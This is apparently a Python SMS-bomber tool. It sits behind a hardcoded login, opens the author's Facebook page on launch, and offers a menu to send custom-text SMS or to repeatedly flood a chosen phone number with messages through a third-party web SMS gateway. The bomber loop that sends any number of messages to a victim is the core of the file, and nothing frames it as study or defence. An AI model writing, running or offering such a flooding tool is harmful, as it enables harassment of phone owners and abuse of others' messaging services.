#coder  : parvej ahmed 
#github : github.com/P4RVEJ
#---------color code--------#
I='\033[1;32m'
Q="\x1b[00m"
dt = f"{Q}[{I}•{Q}]"
n = '\n'
#---------import------------#
import os, sys
import requests 
from requests.structures import CaseInsensitiveDict
import random
import getpass
 
attemps = 0
while attemps < 12345677901:
    username = input(' \033[1;92mEnter Username: ')
    password = input(' \033[1;91mEnter Password: ')
 
    if username == 'MAHAFUZ' and password == 'mahafuz':
        print(' \033[0;92mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
#--------logo-------------#
os.system('xdg-open https://www.facebook.com/1kingmahafuz')
logo =("""                                                
\x1b[38;5;46m                    Assalamu Alaikum😘                   
\x1b[38;5;46m      


    ▒█▀▄▀█ ░█▀▀█ ▒█░▒█ ░█▀▀█ ▒█▀▀▀ ▒█░▒█ ▒█▀▀▀█ 
    ▒█▒█▒█ ▒█▄▄█ ▒█▀▀█ ▒█▄▄█ ▒█▀▀▀ ▒█░▒█ ░▄▄▄▀▀ 
    ▒█░░▒█ ▒█░▒█ ▒█░▒█ ▒█░▒█ ▒█░░░ ░▀▄▄▀ ▒█▄▄▄█
                                           
\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━😘━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46m-MAFUZ RAHMAN
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46m-MAFUZ RAHMAN
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ● \x1b[38;5;46m-0.1
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   ● \x1b[38;5;46m-CUSTOM-SMS
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ● \x1b[38;5;46m-FREE

\033[1;92m       🥀
\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━😘━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
""")
#-------clear------------#
def clear():
    os.system("clear")
    print(logo)
#-------line-------------#
def line():
    print(22*' -')
#---------menu-----------#
def menu():
  clear()
  print(f' {dt} [01] CUSTOM SMS')
  print(f' {dt} [02] CUSTOM SMS BBOMBER')
  print(f' {dt} [03] JOIN GROUP')
  print(f' {dt} [05] EXIT')
  user = input(f' {dt} CHOICE OPTION : ')
  if user in ['01', '1']:
    custom()
  elif user in ['02', '2']:
    customb()
  elif user in ['03', '3']:
    os.system('xdg-open https://facebook.com/groups/2mahafuz/')
  else:
    exit(f' {dt} THANKS FOR USEING MY TOOLS ')
    
#-----------custom sms-----------#
def custom():
  clear()
  nmbr=input(f' {dt} ENTER NUMBER  (+88) : ')
  msg=input(f' {dt} TEXT MESSAGE : ')
  line()
  api = f'https://csfcustomsms.000webhostapp.com/sms.php?number={nmbr}&sms={msg}'
  requests.get(api)
  print('SMS SENT SUCCESSFUL')
  
#----------custom sms bomber---------#
def customb():
  clear()
  nmbr=input(f' {dt} ENTER NUMBER  (+88) : ')
  msg=input(f' {dt} TEXT MESSAGE : ')
  line()
  lmt = int(input(f' {dt} ENTER AMOUNT : '))
  for i in range(lmt):
    api = f'https://csfcustomsms.000webhostapp.com/sms.php?number={nmbr}&sms={msg}'
    requests.get(api)
    print((str(i+1))+f' {dt} MAHAFUZ- SENT SUCCESSFUL')
  print('CUSTOM SMS BOMBING SUCCESSFUL')
#-----------end-------------#
menu()